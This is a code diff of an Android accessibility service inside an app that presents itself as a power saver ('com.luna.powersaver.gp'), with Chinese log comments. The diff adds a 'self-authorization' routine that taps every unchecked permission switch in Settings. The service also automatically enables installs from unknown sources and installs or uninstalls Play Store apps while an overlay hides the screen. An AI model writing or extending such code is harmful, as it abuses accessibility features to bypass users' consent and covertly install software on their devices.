@@ -16,7 +16,6 @@ import com.luna.powersaver.gp.PowerSaver;
 import com.luna.powersaver.gp.R;
 import com.luna.powersaver.gp.common.GPResId;
 import com.luna.powersaver.gp.common.StaticConst;
-import com.luna.powersaver.gp.http.DownloadManager;
 import com.luna.powersaver.gp.manager.StalkerManager;
 import com.luna.powersaver.gp.utils.AppDebugLog;
 import com.luna.powersaver.gp.utils.AppUtil;
@@ -51,7 +50,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         int OPEN_MANUALLY = 4;
         int UNINSTALL_MANUALLY = 5;
         int UNINSTALL_BY_GP = 6;
-        int CLEAR = 10;
+        int SET_PERMISSION = 7;
+        int CLEAR = 100;
     }
 
     // 接收到的最后一次窗口状态变化的事件
@@ -76,14 +76,14 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         }
         AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "NBAccessibilityService.onServiceConnected!");
         PowerSaver.get().addCallback(this);
-        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(StalkerManager.get());
+//        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(StalkerManager.get());
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
         PowerSaver.get().removeCallback(this);
-        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(StalkerManager.get());
+//        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(StalkerManager.get());
     }
 
 
@@ -96,7 +96,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                 + ", action = " + event.getAction() + ", time = " + df.format(new Date(event.getEventTime()))
                 + ", text = " + event.getText() + ", package = " + event.getPackageName()
                 + ", source.text = " + (event.getSource() != null ? event.getSource().getText() : "null")
-                + ", isWork = " + sIsInWork + ", sCurrentType = " + sCurrentWorkType + ", sCurrentState = " + sCurrentWorkState);
+                + ", isWork = " + sIsInWork + ", sCurrentType = " + sCurrentWorkType + ", sCurrentState = " +
+                sCurrentWorkState);
 //        traveselNodeInfo(getRootInActiveWindow(), 0);
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -106,12 +107,20 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         if (sIsInWork) {
             // 先进行18及以上处理，18以下暂不做适配
             if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {
+
+
                 if (!PowerSaver.get().isGuardViewShown()
                         || sCurrentWorkType == TYPE.CLEAR) {
                     // 关闭屏幕
                     handleClearWork(event);
                     return;
                 }
+
+                if (sCurrentWorkType == TYPE.SET_PERMISSION) {
+                    handleSelfPermissionWork(event);
+                    return;
+                }
+
                 if (StalkerManager.get().pCurrentWorkInfo != null
                         && TextUtils.isEmpty(StalkerManager.get().pCurrentWorkInfo.pkg)) {
                     return;
@@ -146,6 +155,56 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         }
     }
 
+    /**
+     * 进行自我授权
+     */
+    private void handleSelfPermissionWork(AccessibilityEvent event) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
+            return;
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "没有部分权限，判断是否处于详情界面");
+
+            AccessibilityNodeInfo source = getRootInActiveWindow();
+            List<AccessibilityNodeInfo> nodes;
+            AccessibilityNodeInfo info;
+            if (source == null) {
+                return;
+            }
+            String pkg = event.getPackageName().toString();
+            if (GPResId.SETTINGS_PKG.equals(pkg)) {
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于设置界面，判断是否处于详情页");
+                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getDetailSettingHeaderId());
+                if (nodes != null && nodes.size() > 0) {
+                    // 当前处于详情页
+                    info = travsalToFindFirstInfoContainsName(source, "TextView",
+                            getResources().getString(R.string.powersaver_detail_setting_title_permission));
+                    if (info == null)
+                        return;
+                    boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击进入权限列表页面，结果: " + result);
+                    return;
+                }
+            }
+            if (GPResId.INSTALLER_PKG.equals(pkg)
+                    || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)) {
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "判断当前是否处于权限列表界面");
+                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getDetailSettingPermissionSwitchId());
+                if (nodes == null || nodes.size() < 1) {
+                    return;
+                }
+                for (int i = 0; i < nodes.size(); i++) {
+                    info = nodes.get(i);
+                    if (info != null && !info.isChecked()) {
+                        info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+                StalkerManager.get().saveCurrentTask();
+                AppUtil.jumpToHome(StaticConst.sContext);
+                StalkerManager.get().doNextStart();
+            }
+        }
+    }
+
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
     private void handleUninstallByGpWork(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
@@ -153,7 +212,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
 
             if (GPResId.PACKAGE.equals(event.getPackageName())) {
 
-                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " + sCurrentWorkState);
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " +
+                        sCurrentWorkState);
                 AccessibilityNodeInfo source = getRootInActiveWindow();
                 if (source != null) {
                     List<AccessibilityNodeInfo> nodes;
@@ -163,7 +223,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                         nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                                 .getTitleId());
                         if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
-                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0).getText());
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0)
+                                    .getText());
                             nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getUninstallBtnId());
                             if (nodes != null && nodes.size() > 0) {
                                 info = nodes.get(0);
@@ -246,38 +307,39 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                 if (source != null) {
                     if (sCurrentWorkState == 2) {
                         AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找允许安装的源选项");
-                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                             AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "开始查找特定含未知源的TextView");
                             info = travsalToFindFirstInfoContainsName(source, "TextView",
                                     getResources().getString(R.string.powersaver_setting_item_title_unknown_source));
-                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSettingListViewId());
-                            AccessibilityNodeInfo list = null;
-                            if (nodes != null && nodes.size() > 0) {
-                                list = nodes.get(0);
-                            }
                             if (info == null) {
-                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到选项，需要滚动");
-                                if (list != null)
-                                    list.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+                                // 找不到，很可能因为已经在弹窗选项界面
+                                sCurrentWorkState = 3;
+                                handleInstallWork(event);
                                 return;
                             }
                             AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到含未知源选项的项，text = " + info.getText());
                             info = travsalToFindFirstInfoContainsName(info.getParent(), "Switch", null);
                             if (info == null) {
-                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到选择按钮，需要滚动");
-                                if (list != null)
-                                    list.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+                                // 找不到，很可能因为已经在弹窗选项界面
+                                sCurrentWorkState = 3;
+                                handleInstallWork(event);
                                 return;
                             }
-                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到切换器为: " + info.getClassName() + ", " +
-                                    "isChecked = " + info.isChecked() + ", isClick = " + info.isClickable());
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到切换器为: " + info.getClassName());
                             if (!info.isChecked()) {
-                                boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                 sCurrentWorkState = 3;
                                 AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击设置为确定，结果: " + result);
                             } else {
                                 sCurrentWorkState = 0;
                                 performGlobalBack();
+                                // 重新唤起安装
+                                mHandler.postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        StalkerManager.get().doContinueAfterDownloaded(null);
+                                    }
+                                }, 400);
                             }
                         }
                     } else if (sCurrentWorkState == 3) {
@@ -286,8 +348,6 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                             nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
                             if (nodes == null || nodes.size() < 1) {
                                 AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到确定弹窗按钮列表");
-                                sCurrentWorkState = 0;
-                                performGlobalBack();
                                 return;
                             }
                             info = nodes.get(0);
@@ -296,12 +356,22 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                                 return;
                             }
                             boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "确定允许未知安装源，结果:" + result);
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "确定允许未知安装源，结果:" + result + ", info" +
+                                    ".isClickable = " + info.isClickable());
                             if (result) {
                                 sCurrentWorkState = 2;
+                                performGlobalBack();
+                                // 延迟 300 ms是为了避免冲突
+                                mHandler.postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        StalkerManager.get().doContinueAfterDownloaded(null);
+                                    }
+                                }, 400);
                             } else {
                                 sCurrentWorkState = 0;
                                 performGlobalBack();
+                                StalkerManager.get().doNextStartAfterError(0, "开启未知源安装失败");
                             }
                         }
                     }
@@ -327,7 +397,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                         if (info == null) {
                             return;
                         }
-                        if (info.getText() != null && getResources().getString(R.string.powersaver_dialog_title_install_blocked)
+                        if (info.getText() != null && getResources().getString(R.string
+                                .powersaver_dialog_title_install_blocked)
                                 .equals(info.getText().toString())) {
                             AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前是禁止安装弹窗，查找按钮跳转设置界面");
                             nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
@@ -477,12 +548,15 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                         if (nodes != null && nodes.size() > 0) {
                             for (int i = 0; i < nodes.size(); i++) {
                                 info = nodes.get(i);
-                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "该项的值：" + (info != null ? info.getText() : "none"));
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "该项的值：" + (info != null ? info.getText()
+                                        : "none"));
                                 if (info != null && info.getText() != null
-                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText().toString())) {
+                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText()
+                                        .toString())) {
                                     AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到名称相同的指定项，获取其父节点进行点击!");
                                     if (info.getParent() != null) {
-                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo
+                                                .ACTION_CLICK);
                                         AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击了查找到的项: 结果: " + result);
                                         if (result) {
                                             StalkerManager.get().doContinueAfterSearch();
@@ -509,10 +583,12 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                             for (int i = 0; i < nodes.size(); i++) {
                                 info = nodes.get(i);
                                 if (info != null && info.getText() != null
-                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText().toString())) {
+                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText()
+                                        .toString())) {
                                     AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到名称相同的指定项，获取其父节点进行点击!");
                                     if (info.getParent() != null) {
-                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo
+                                                .ACTION_CLICK);
                                         AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击了查找到的项: 结果: " + result);
                                         if (result) {
                                             StalkerManager.get().doContinueAfterSearch();
@@ -589,10 +665,10 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                 spyIsAppInstalled(event);
             }
         }
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
-                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             if (event.getPackageName() != null && GPResId.PACKAGE.equals(event.getPackageName())) {
-                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " + sCurrentWorkState);
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " +
+                        sCurrentWorkState);
                 AccessibilityNodeInfo source = getRootInActiveWindow();
                 if (source != null) {
                     List<AccessibilityNodeInfo> nodes;
@@ -602,7 +678,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                                 .getTitleId());
                         if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
                             mIsTimeOut = false;
-                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0).getText());
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0)
+                                    .getText());
                             AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，首先判断是否有接收按钮");
                             nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                             AccessibilityNodeInfo info;
@@ -612,7 +689,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                                 if (nodes != null && nodes.size() > 0) {
                                     info = nodes.get(0);
                                     boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
+                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info
+                                            .getClassName() + ", " +
                                             "isClickable = " + info.isClickable()
                                             + ", click result = " + result);
                                     if (result) {
@@ -627,7 +705,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                                 if (nodes != null && nodes.size() > 0) {
                                     info = nodes.get(0);
                                     boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
+                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到安装按钮，执行安装程序! class = " + info
+                                            .getClassName() + ", " +
                                             "isClickable =" +
 
                                             " " + info.isClickable()
@@ -655,7 +734,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                                 mIsTimeOut = false;
                                 AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于首页，需要重新进入");
                                 if (sRetryTime > 0) {
-                                    AppUtil.jumpToStore(StaticConst.sContext, StalkerManager.get().pCurrentWorkInfo.pkg);
+                                    AppUtil.jumpToStore(StaticConst.sContext, StalkerManager.get().pCurrentWorkInfo
+                                            .pkg);
                                 } else {
                                     StalkerManager.get().doNextStartAfterError(0, "打开详情页失败");
                                 }
@@ -671,6 +751,9 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                     } else if (sCurrentWorkState == 1) {
                         // 当前正在监听下载
                         AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "非通知栏事件，监测下载中，现在要监测任务是否完成");
+                        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {
+                            performGlobalBack();
+                        }
                         spyIsAppInstalled(event);
                     } else if (sCurrentWorkState == 3) {
                         nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
@@ -682,7 +765,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                             if (nodes != null && nodes.size() > 0) {
                                 info = nodes.get(0);
                                 boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info
+                                        .getClassName() + ", " +
                                         "isClickable = " + info.isClickable()
                                         + ", click result = " + result);
                                 if (result) {
@@ -706,7 +790,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
             AccessibilityNodeInfo source = getRootInActiveWindow();
             if (source != null) {
                 AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "开始检查是否有重试按钮");
-                List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getErrorRetryResId());
+                List<AccessibilityNodeInfo> nodes = source.findAccessibilityNodeInfosByViewId(GPResId
+                        .getErrorRetryResId());
                 if (nodes != null && nodes.size() > 0) {
                     AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前打开GP失败，出现网络错误情况，判断并执行重试!");
                     if (sRetryTime > 0) {
@@ -745,7 +830,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         }
     }
 
-    private AccessibilityNodeInfo travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName, String text) {
+    private AccessibilityNodeInfo travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName,
+                                                                     String text) {
         if (info == null)
             return null;
         if ((TextUtils.isEmpty(widgetName) || info.getClassName().toString().contains(widgetName))
@@ -768,7 +854,7 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
             public void run() {
                 performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
             }
-        }, 400);
+        }, 200);
     }
 
     private boolean traveselNodeInfo(AccessibilityNodeInfo info, int depth) {
@@ -778,7 +864,8 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
             spaceCount.append("--");
         }
         if (info != null) {
-            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, spaceCount.toString() + "info.class = " + info.getClassName() + ", getChildCount = " +
+            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, spaceCount.toString() + "info.class = " + info.getClassName
+                    () + ", getChildCount = " +
                     info.getChildCount()
                     + ", label = " + info.getText() + ", packageName = " + info.getPackageName() + ", isClick = " +
                     info.isClickable() + ", isEnabled = " + info.isEnabled()
